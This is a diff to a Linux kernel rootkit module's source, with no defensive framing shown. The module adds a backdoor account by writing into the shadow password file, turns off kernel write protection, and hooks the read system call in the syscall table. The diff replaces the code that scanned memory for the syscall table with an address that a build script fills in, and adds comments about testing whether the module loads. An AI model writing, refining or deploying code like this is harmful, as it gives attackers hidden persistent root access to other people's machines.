@@ -10,6 +10,7 @@
 #include <linux/fs.h>
 #include <asm/uaccess.h>
 
+// check whether system is 32-bit or 64-bit to assign appropriate pointer size
 #if defined(__i386__)
 #define START_CHECK 0xc0000000
 #define END_CHECK 0xd0000000
@@ -22,22 +23,8 @@ typedef unsigned long psize;
 
 asmlinkage int (*o_read)(int fd, void* buf, size_t count);
 
-psize *sys_call_table;
-
-psize **find(void) {
-
-	psize **sctable;
-	psize i = START_CHECK;
-
-	while (i < END_CHECK) {
-
-		sctable = (psize **) i;
-		if (sctable[__NR_close] == (psize *) sys_close) return &sctable[0];
-		i += sizeof(void *);
-	}
-
-	return NULL;
-}
+// "table" will be replaced with the system call table address found by grep in compile.sh
+psize *sys_call_table = 0xTABLE;
 
 // backdoor account
 // ================
@@ -230,7 +217,7 @@ void add_backdoor(void) {
 	add_text_to_file(SHADOW_STRING, SHADOW_PATH);
 	
 	write_cr0(read_cr0() & (~ 0x10000));
-	o_read = (void *) xchg(&sys_call_table[__NR_read], backdoor_read);
+	o_read = (void *) xchg(&sys_call_table[__NR_read], backdoor_read); //comment out for testing if module loads
 	write_cr0(read_cr0() | 0x10000);
 }
 
@@ -240,7 +227,7 @@ void remove_backdoor(void) {
 	delete_text_from_file(SHADOW_STRING, SHADOW_PATH);
 
 	write_cr0(read_cr0() & (~ 0x10000));
-	xchg(&sys_call_table[__NR_read],o_read);
+	xchg(&sys_call_table[__NR_read],o_read); //comment out for testing if the module loads
 	write_cr0(read_cr0() | 0x10000);
 }
 
@@ -248,15 +235,8 @@ void remove_backdoor(void) {
 // ==========================
 
 int init_module(void) {
-    	
-	if ((sys_call_table = (psize *) find())) {
-		printk("sys_call_table found at %p\n", sys_call_table);
-	}
-	
-	else {
-		printk("sys_call_table not found, aborting\n");
-		return 1;
-	}
+
+	printk("sys_call_table found at %p\n", sys_call_table);
 
 	add_backdoor();
     
